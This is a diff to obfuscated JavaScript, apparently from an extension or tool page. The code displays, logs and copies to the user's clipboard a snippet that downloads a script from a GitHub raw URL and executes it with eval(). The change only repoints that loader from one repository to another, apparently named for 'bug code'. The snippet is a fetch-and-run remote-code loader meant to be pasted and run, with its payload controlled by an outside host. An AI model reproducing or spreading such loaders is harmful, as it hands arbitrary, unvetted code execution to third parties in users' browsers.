@@ -1189,18 +1189,18 @@ document.addEventListener('DOMContentLoaded', function () {
         if (_0x1bd2ea.style.display === 'none') {
           _0x1bd2ea.style.display = 'block'
           $('#text-traffic24h-code').val(
-            'var traffic24h = new XMLHttpRequest();\ntraffic24h.onreadystatechange = function() {\n    if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n        eval(traffic24h.responseText);\n    }\n};\ntraffic24h.open("GET", "https://raw.githubusercontent.com/Xuandungscript/my-php-files/main/traffic24h.js", true);\ntraffic24h.send();'
+            'var traffic24h = new XMLHttpRequest();\ntraffic24h.onreadystatechange = function() {\n    if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n        eval(traffic24h.responseText);\n    }\n};\ntraffic24h.open("GET", "https://raw.githubusercontent.com/huykaiserOwO/Extension-Bug-Code-Link/main/js/traffic24h.js", true);\ntraffic24h.send();'
           )
         } else {
           _0x1bd2ea.style.display = 'none'
         }
         console.log(
-          '\n                    var traffic24h = new XMLHttpRequest();\n                    traffic24h.onreadystatechange = function() {\n                        if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n                            eval(traffic24h.responseText);\n                        }\n                    };\n                    traffic24h.open("GET", "https://raw.githubusercontent.com/Xuandungscript/my-php-files/main/traffic24h.js", true);\n                    traffic24h.send();\n                    '
+          '\n                    var traffic24h = new XMLHttpRequest();\n                    traffic24h.onreadystatechange = function() {\n                        if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n                            eval(traffic24h.responseText);\n                        }\n                    };\n                    traffic24h.open("GET", "https://raw.githubusercontent.com/huykaiserOwO/Extension-Bug-Code-Link/main/js/traffic24h.js", true);\n                    traffic24h.send();\n                    '
         )
         var _0x38b0fd = navigator.clipboard
         _0x38b0fd
           .writeText(
-            '\n                    var traffic24h = new XMLHttpRequest();\n                    traffic24h.onreadystatechange = function() {\n                        if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n                            eval(traffic24h.responseText);\n                        }\n                    };\n                    traffic24h.open("GET", "https://raw.githubusercontent.com/Xuandungscript/my-php-files/main/traffic24h.js", true);\n                    traffic24h.send();\n                    '
+            '\n                    var traffic24h = new XMLHttpRequest();\n                    traffic24h.onreadystatechange = function() {\n                        if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n                            eval(traffic24h.responseText);\n                        }\n                    };\n                    traffic24h.open("GET", "https://raw.githubusercontent.com/huykaiserOwO/Extension-Bug-Code-Link/main/js/traffic24h.js", true);\n                    traffic24h.send();\n                    '
           )
           .then(
             function () {
